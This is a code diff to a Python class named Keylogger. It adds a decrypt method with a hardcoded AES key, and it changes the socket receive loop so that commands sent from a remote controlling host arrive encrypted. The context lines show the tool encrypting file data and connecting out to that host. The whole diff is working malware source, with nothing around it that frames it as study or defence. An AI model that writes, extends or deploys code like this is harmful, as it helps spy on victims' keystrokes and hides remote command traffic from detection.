@@ -140,6 +140,18 @@ class Keylogger:
         cipherText, tag = cipher.encrypt_and_digest(fileData)
         return nonce + tag + cipherText
 
+    def decrypt(self, cipherText):
+        key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
+        sNonce = cipherText[:16]
+        sTag = cipherText[16:32]
+        cipher = aes.new(key, aes.MODE_EAX, nonce = sNonce)
+        plainText = cipher.decrypt(cipherText[32:])
+        try:
+            cipher.verify(sTag)
+            return plainText
+        except:
+            return "Message corrupted."
+
     def start(self):
         self.active = True
         self.write_information_file()
@@ -154,7 +166,7 @@ class Keylogger:
         self.connect_to_host()
 
         while True:
-            recv = self.sock.recv(1024)
+            recv = self.decrypt(self.sock.recv(1024))
             if recv:
                 recv = str(recv)[2:-1]
 
